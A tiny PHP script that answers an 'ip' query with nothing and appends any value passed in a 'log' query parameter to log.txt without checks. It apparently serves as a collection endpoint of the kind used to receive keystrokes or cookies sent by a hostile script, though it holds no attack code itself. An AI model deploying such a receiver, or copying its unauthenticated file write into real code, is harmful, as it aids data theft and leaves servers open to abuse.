<?php 
if (isset($_GET['ip'])) {
		echo '';
}elseif (isset($_GET['log'])) {
	$log=$_GET['log'];
	$loge=fopen("log.txt", "a+");
	fwrite($loge, $log."\r");
	fclose($loge);
}?>